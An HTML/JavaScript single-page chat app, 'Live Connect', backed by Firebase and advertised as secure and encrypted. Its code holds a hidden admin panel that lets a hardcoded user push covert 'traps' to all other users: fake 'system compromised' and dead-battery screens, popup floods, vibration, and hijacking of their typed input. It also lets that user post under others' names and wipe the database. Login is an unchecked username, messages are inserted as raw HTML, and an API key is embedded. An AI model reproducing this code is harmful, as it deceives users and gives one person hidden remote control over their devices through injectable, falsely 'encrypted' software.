<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Connect | Secure Messaging</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root {
            --primary: #00d2ff;
            --accent: #9d50bb;
            --danger: #ff4b2b;
            --bg: #0b0d17;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Inter', sans-serif; }
        body { margin: 0; background: var(--bg); color: #fff; overflow: hidden; height: 100vh; }

        .app-container {
            max-width: 450px; margin: 0 auto; height: 100vh;
            background: radial-gradient(circle at top right, #1a1c2c, #0b0d17);
            display: flex; flex-direction: column; position: relative;
        }

        /* Top Navigation */
        header {
            padding: 20px; display: flex; justify-content: space-between; align-items: center;
            background: rgba(0,0,0,0.2); backdrop-filter: blur(10px); z-index: 10;
        }
        header h1 { font-size: 1.1rem; margin: 0; letter-spacing: 2px; font-weight: 800; color: var(--primary); }
        .logout-btn { background: var(--glass); padding: 10px; border-radius: 12px; border: 1px solid var(--glass-border); color: var(--danger); }

        /* Pages */
        .page { display: none; flex: 1; overflow-y: auto; padding: 20px; animation: slideUp 0.4s ease; }
        .active { display: flex; flex-direction: column; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        /* Modern Box Layouts */
        .box {
            background: var(--glass); border: 1px solid var(--glass-border);
            border-radius: 24px; padding: 20px; margin-bottom: 20px; backdrop-filter: blur(10px);
        }
        
        /* Grid Buttons */
        .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .menu-item {
            background: var(--glass); border: 1px solid var(--glass-border);
            padding: 25px 15px; border-radius: 20px; text-align: center; cursor: pointer;
        }
        .menu-item i { font-size: 24px; margin-bottom: 10px; display: block; color: var(--primary); }
        .menu-item span { font-size: 13px; font-weight: 600; opacity: 0.8; }

        /* Admin Control Center */
        .admin-panel {
            display: none; background: rgba(255, 0, 85, 0.05); 
            border: 1px solid rgba(255, 0, 85, 0.2); border-radius: 24px; padding: 15px;
            margin-bottom: 20px; display: none; grid-template-columns: repeat(4, 1fr); gap: 10px;
        }
        .admin-panel.active-panel { display: grid; }
        .power-box {
            background: rgba(0,0,0,0.3); padding: 12px; border-radius: 15px; text-align: center;
            border: 1px solid var(--glass-border); cursor: pointer;
        }
        .power-box i { font-size: 18px; color: var(--danger); display: block; margin-bottom: 5px; }
        .power-box span { font-size: 9px; text-transform: uppercase; font-weight: bold; }

        /* Modern Chat Bubbles */
        .bubble {
            max-width: 85%; padding: 14px 18px; border-radius: 22px; font-size: 14px; margin-bottom: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); line-height: 1.4;
        }
        .me { align-self: flex-end; background: linear-gradient(135deg, var(--primary), var(--accent)); color: #fff; border-bottom-right-radius: 4px; }
        .other { align-self: flex-start; background: #222533; border: 1px solid var(--glass-border); border-bottom-left-radius: 4px; }
        .bubble b { display: block; font-size: 10px; margin-bottom: 4px; opacity: 0.6; text-transform: uppercase; letter-spacing: 1px; }

        /* Floating Input Bar */
        .input-area {
            padding: 20px; background: transparent;
        }
        .input-pill {
            background: rgba(255,255,255,0.07); backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border); border-radius: 30px;
            padding: 8px 15px; display: flex; align-items: center; gap: 12px;
        }
        .input-pill input { flex: 1; background: transparent; border: none; color: #fff; font-size: 14px; }

        /* Scare Screen */
        #hacked-overlay {
            display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
            background:#000; z-index:10000; flex-direction:column; align-items:center; justify-content:center;
            font-family: 'Courier New', monospace; text-align:center;
        }
    </style>
</head>
<body>

<div id="hacked-overlay">
    <i class="fa-solid fa-user-secret" style="font-size: 60px; color: var(--danger);"></i>
    <h2 id="ov-msg" style="margin-top:20px; color: #fff;">SYSTEM COMPROMISED</h2>
    <div id="ov-logs" style="color: #00ff41; font-size: 12px; margin-top: 15px;"></div>
</div>

<div class="app-container">
    <header>
        <h1>LIVE CONNECT</h1>
        <div class="logout-btn" onclick="userLogout()"><i class="fa-solid fa-power-off"></i></div>
    </header>

    <div id="loginPage" class="page active">
        <div class="box" style="margin-top: 60px; text-align: center;">
            <div style="width: 70px; height: 70px; background: rgba(0,210,255,0.1); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
                <i class="fa-solid fa-shield-halved" style="font-size: 30px; color: var(--primary);"></i>
            </div>
            <h3>Authentication</h3>
            <p style="font-size: 12px; opacity: 0.5;">Join the encrypted grid.</p>
            <input type="text" id="uInp" placeholder="Enter Username" style="width: 100%; padding: 15px; border-radius: 15px; border: 1px solid var(--glass-border); background: rgba(0,0,0,0.3); color: #fff; text-align: center; margin-top: 15px;">
            <button onclick="doLogin()" style="width: 100%; padding: 15px; border-radius: 15px; border: none; background: linear-gradient(to right, var(--primary), var(--accent)); color: #fff; font-weight: bold; margin-top: 20px; cursor: pointer;">CONNECT</button>
        </div>
    </div>

    <div id="homePage" class="page">
        <div class="box">
            <span style="font-size: 12px; opacity: 0.5;">Welcome back,</span>
            <h2 id="greetName" style="margin: 5px 0 0 0;">Agent</h2>
            <div style="margin-top: 15px; display: flex; gap: 10px;">
                <div style="font-size: 10px; background: rgba(0,255,65,0.1); color: #00ff41; padding: 5px 10px; border-radius: 10px; border: 1px solid #00ff41;">LIVE</div>
                <div style="font-size: 10px; background: rgba(0,210,255,0.1); color: var(--primary); padding: 5px 10px; border-radius: 10px; border: 1px solid var(--primary);"><span id="nodeCount">0</span> NODES</div>
            </div>
        </div>

        <div class="grid-menu">
            <div class="menu-item" onclick="openChannel('global', false)">
                <i class="fa-solid fa-globe"></i>
                <span>Global Grid</span>
            </div>
            <div class="menu-item">
                <i class="fa-solid fa-user-lock"></i>
                <span>Private</span>
            </div>
        </div>

        <p style="font-size: 11px; opacity: 0.4; margin: 25px 0 15px 5px; letter-spacing: 2px;">ACTIVE SIGNALS</p>
        <div id="activeList"></div>
    </div>

    <div id="chatPage" class="page">
        <div id="adminPanel" class="admin-panel">
            <div class="power-box" onclick="exec('freeze')"><i class="fa-solid fa-snowflake"></i><span>Freeze</span></div>
            <div class="power-box" onclick="exec('scare')"><i class="fa-solid fa-bug"></i><span>Matrix</span></div>
            <div class="power-box" onclick="exec('vibrate')"><i class="fa-solid fa-mobile-vibration"></i><span>Vibrate</span></div>
            <div class="power-box" onclick="exec('popups')"><i class="fa-solid fa-bomb"></i><span>Popups</span></div>
            <div class="power-box" onclick="exec('battery')"><i class="fa-solid fa-battery-empty"></i><span>Dead</span></div>
            <div class="power-box" onclick="exec('hijack')"><i class="fa-solid fa-keyboard"></i><span>Hijack</span></div>
            <div class="power-box" onclick="exec('restore')" style="border-color: #00ff41;"><i class="fa-solid fa-rotate-left" style="color:#00ff41"></i><span style="color:#00ff41">Reset</span></div>
            <div class="power-box" onclick="nukeDB()" style="border-color: var(--danger);"><i class="fa-solid fa-radiation"></i><span>Nuke</span></div>
        </div>

        <div id="msgBox" style="display:flex; flex-direction:column; padding-bottom: 80px;"></div>

        <div class="input-area" style="position: absolute; bottom: 0; left: 0; width: 100%;">
            <div class="input-pill">
                <i id="wandIcon" class="fa-solid fa-wand-magic-sparkles" style="display:none; color: gold; cursor: pointer;" onclick="toggleAdmin()"></i>
                <label for="imgIn"><i class="fa-solid fa-circle-plus" style="color: var(--primary); font-size: 20px; cursor: pointer;"></i></label>
                <input type="file" id="imgIn" accept="image/*" style="display:none;" onchange="sendImg(this)">
                <input type="text" id="msgIn" placeholder="Type message...">
                <i class="fa-solid fa-paper-plane" style="color: var(--primary); cursor: pointer;" onclick="sendTxt()"></i>
            </div>
        </div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const config = { apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE", databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com" };
const app = initializeApp(config);
const db = getDatabase(app);
let myName = null, myRoom = "global", isPriv = false;
const ADMIN = "Nazim";

window.onload = () => {
    const s = localStorage.getItem("lc_user");
    if(s) startApp(s);
};

window.doLogin = () => {
    const v = document.getElementById("uInp").value.trim();
    if(!v) return;
    localStorage.setItem("lc_user", v);
    startApp(v);
};

function startApp(n) {
    myName = n;
    document.getElementById("loginPage").classList.remove("active");
    document.getElementById("homePage").classList.add("active");
    document.getElementById("greetName").innerText = myName;
    if(myName === ADMIN) document.getElementById("wandIcon").style.display="block";

    onValue(ref(db, "traps/" + myName), snap => {
        const t = snap.val();
        const sc = document.getElementById("hacked-overlay");
        if(t === "freeze") { sc.style.display="flex"; document.getElementById("ov-msg").innerText="ENCRYPTION ERROR"; }
        if(t === "vibrate") { if(navigator.vibrate) navigator.vibrate([400,200,400]); }
        if(t === "popups") { for(let i=0; i<5; i++) alert("SYSTEM ALERT!"); }
        if(t === "battery") { document.body.style.opacity = "0.05"; alert("Device Failure: Battery 1%"); }
        if(t === "hijack") { document.getElementById("msgIn").oninput = function() { this.value = "NAZIM IS MY KING 👑"; }; }
        if(t === "scare") { sc.style.display="flex"; runMatrix(); }
        if(t === "restore") { sc.style.display="none"; document.body.style.opacity="1"; document.getElementById("msgIn").oninput = null; }
    });

    if(myName !== ADMIN) set(ref(db, "signals/" + myName), true);
    loadUsers();
}

function runMatrix() {
    const l = ["> CONNECTING...", "> DOWNLOADING DATA...", "> DONE."];
    const b = document.getElementById("ov-logs"); b.innerHTML = "";
    let i = 0; setInterval(() => { if(i < l.length) b.innerHTML += l[i++] + "<br>"; }, 600);
}

window.loadUsers = () => {
    onValue(ref(db, "signals"), snap => {
        const list = document.getElementById("activeList"); list.innerHTML = "";
        let c = 0;
        snap.forEach(u => {
            c++;
            if(u.key !== myName) {
                let d = document.createElement("div"); d.className = "box";
                d.style = "padding: 15px; margin-bottom: 10px; display: flex; justify-content: space-between; cursor: pointer; align-items: center;";
                d.innerHTML = `<span><i class="fa-solid fa-user-circle" style="color:var(--primary)"></i> &nbsp; ${u.key}</span> <i class="fa-solid fa-chevron-right" style="opacity:0.2; font-size:10px;"></i>`;
                d.onclick = () => openChannel(u.key, true);
                list.appendChild(d);
            }
        });
        document.getElementById("nodeCount").innerText = c;
    });
};

window.openChannel = (target, p) => {
    myRoom = p ? [myName, target].sort().join("::") : "global";
    isPriv = p;
    document.getElementById("homePage").classList.remove("active");
    document.getElementById("chatPage").classList.add("active");
    sync();
};

window.sendTxt = () => {
    const inp = document.getElementById("msgIn");
    if(!inp.value) return;
    if(myName === ADMIN && inp.value.startsWith("/as ")) {
        const p = inp.value.split(" ");
        push(ref(db, "msgs/global"), { s: p[1], t: inp.value.replace("/as "+p[1]+" ", "") });
    } else {
        push(ref(db, isPriv ? "msgs/priv/" + myRoom : "msgs/global"), { s: myName, t: inp.value });
    }
    inp.value = "";
};

window.sendImg = (f) => {
    const r = new FileReader();
    r.onload = (e) => push(ref(db, isPriv ? "msgs/priv/" + myRoom : "msgs/global"), { s: myName, i: e.target.result });
    r.readAsDataURL(f.files[0]);
};

function sync() {
    const path = isPriv ? "msgs/priv/" + myRoom : "msgs/global";
    onValue(ref(db, path), snap => {
        const box = document.getElementById("msgBox"); box.innerHTML = "";
        snap.forEach(m => {
            const d = m.val();
            const div = document.createElement("div"); div.className = `bubble ${d.s === myName ? 'me' : 'other'}`;
            div.innerHTML = `<b>${d.s}</b> ${d.t ? d.t : `<img src="${d.i}" style="max-width:100%; border-radius:15px;">`}`;
            if(myName === ADMIN) {
                let x = document.createElement("span"); x.innerHTML = "✕";
                x.style = "position:absolute; top:-10px; right:0; color:red; cursor:pointer;";
                x.onclick = () => remove(ref(db, path + "/" + m.key));
                div.appendChild(x);
            }
            box.appendChild(div);
        });
        box.parentElement.scrollTop = box.parentElement.scrollHeight;
    });
}

window.toggleAdmin = () => { document.getElementById("adminPanel").classList.toggle("active-panel"); };
window.exec = (type) => { onValue(ref(db, "signals"), snap => { snap.forEach(u => { if(u.key !== ADMIN) set(ref(db, "traps/" + u.key), type); }); }, {onlyOnce:true}); };
window.nukeDB = () => { if(confirm("NUKE ALL DATA?")) remove(ref(db)); };
window.userLogout = () => { localStorage.clear(); location.reload(); };
document.getElementById("msgIn").addEventListener("keypress", (e) => { if(e.key === 'Enter') sendTxt(); });
</script>
</body>
</html>
